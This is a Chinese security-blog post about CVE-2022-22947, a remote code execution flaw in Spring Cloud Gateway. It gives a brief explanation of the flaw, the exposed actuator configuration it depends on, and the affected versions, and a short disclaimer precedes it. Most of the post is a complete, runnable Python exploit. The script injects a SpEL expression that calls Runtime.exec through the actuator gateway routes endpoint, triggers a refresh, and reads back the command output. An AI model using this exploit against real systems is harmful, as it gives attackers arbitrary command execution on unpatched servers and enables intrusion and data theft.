<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/cYNiXPzTubztEeR2q5xAew)

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责，EXP 与 POC 仅仅只供对已授权的目标使用测试，对未授权目标的测试本公众号不承担责任，均由本人自行承担。本公众号中的漏洞均为公开的漏洞收集！如果本文您认为不适宜被发布，请在后台联系我们删除，或发送到运营的电子邮箱：tang_wenshu@outlook.com。

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

  

  

漏洞说明
----

使用 Spring Cloud Gateway 的应用如果对外暴露了 Gateway Actuator 端点时，则可能存在被 CVE-2022-22947 漏洞利用的风险。攻击者可通过利用此漏洞执行 SpEL 表达式，允许在远程主机上进行任意远程执行。获取系统权限。

**利用前提：**

除了 Spring Cloud Gateway 外，程序还用到了 Spring Boot Actuator 组件（它用于对外提供 /actuator/ 接口）；

Spring 配置对外暴露 gateway 接口，如 application.properties 配置为：

```
# 默认为true  
management.endpoint.gateway.enabled=true  
   
   
# 以逗号分隔的一系列值，默认为 health  
# 若包含 gateway 即表示对外提供 Spring Cloud Gateway 接口  
management.endpoints.web.exposure.include=gateway  

```

**漏洞类型：**命令执行漏洞

**漏洞危害：**高危

**影响版本：**

Spring Cloud Gateway < 3.0.7 & < 3.1.1

漏洞EXP
-----

```
# Exploit Title: Spring Cloud Gateway 3.1.0 - Remote Code Execution (RCE)  
# Google Dork: N/A  
# Date: 03/03/2022  
# Exploit Author: Carlos E. Vieira  
# Vendor Homepage: https://spring.io/  
# Software Link: https://spring.io/projects/spring-cloud-gateway  
# Version: This vulnerability affect Spring Cloud Gateway < 3.0.7 & < 3.1.1  
# Tested on: 3.1.0  
# CVE : CVE-2022-22947  
  
import random  
import string  
import requests  
import json  
import sys  
import urllib.parse  
import base64  
  
headers = { "Content-Type": "application/json" , 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36','Accept' : '*/*'}  
proxies = {  
    'http': 'http://172.29.32.1:8081',  
    'https': 'http://172.29.32.1:8081',  
}  
id = ''.join(random.choice(string.ascii_lowercase) for i in range(8))  
  
def exploit(url, command):  
      
    payload = { "id": id, "filters": [{ "name": "AddResponseHeader", "args": { "name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\u0022"+command+"\u0022).getInputStream()))}"\}\}],"uri": "http://example.com"}  
      
    commandb64 =base64.b64encode(command.encode('utf-8')).decode('utf-8')  
  
    rbase = requests.post(url + '/actuator/gateway/routes/'+id, headers=headers, data=json.dumps(payload), proxies=proxies, verify=False)  
    if(rbase.status_code == 201):  
        print("[+] Stage deployed to /actuator/gateway/routes/"+id)  
        print("[+] Executing command...")  
        r = requests.post(url + '/actuator/gateway/refresh', headers=headers, proxies=proxies, verify=False)  
        if(r.status_code == 200):  
            print("[+] getting result...")  
            r = requests.get(url + '/actuator/gateway/routes/' + id, headers=headers, proxies=proxies, verify=False)  
            if(r.status_code == 200):  
                get_response = r.json()  
                clean(url, id)  
                return get_response['filters'][0].split("'")[1]  
            else:  
                print("[-] Error: Invalid response")  
                clean(url, id)  
                exit(1)  
        else:  
            clean(url, id)  
            print("[-] Error executing command")  
  
      
def clean(url, id):  
    remove = requests.delete(url + '/actuator/gateway/routes/' + id, headers=headers, proxies=proxies, verify=False)  
    if(remove.status_code == 200):  
        print("[+] Stage removed!")  
    else:  
        print("[-] Error: Fail to remove stage")  
  
def banner():  
    print("""  
    ###################################################  
    #                                                 #  
    #   Exploit for CVE-2022-22947                    #  
    #   - Carlos Vieira (Crowsec)                     #  
    #                                                 #  
    #   Usage:                                        #  
    #   python3 exploit.py <url> <command>            #  
    #                                                 #  
    #   Example:                                      #  
    #   python3 exploit.py http://localhost:8080 'id' #  
    #                                                 #  
    ###################################################  
    """)  
  
def main():  
    banner()  
    if len(sys.argv) != 3:  
        print("[-] Error: Invalid arguments")  
        print("[-] Usage: python3 exploit.py <url> <command>")  
        exit(1)  
    else:  
        url = sys.argv[1]  
        command = sys.argv[2]  
        print(exploit(url, command))  
if __name__ == '__main__':  
    main() 
```

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/yqP4lghX1JXRJibe2m9VF2NhPia9Myeouc7Uo3ia3j2iaDvrVVNDdT5Z9NaOoNSTMiad7U21mFXJjUQWuc9AN3BD0Vg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/yqP4lghX1JXRJibe2m9VF2NhPia9MyeouczCxy9Ltjp3Licnic0UuyK2rETicZwDmX78J9XMGyBp89WAibn26SaOlV6A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/6PfJksVUnzcgOBQc60Bzm4BkWoDmLEguQwn8Z4a7QNprDcqKrNNBibNyJgj5oozrKKnicJgkJqQzC2J5GYGCRDxA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

后台回复“粉丝群”加入公众号粉丝群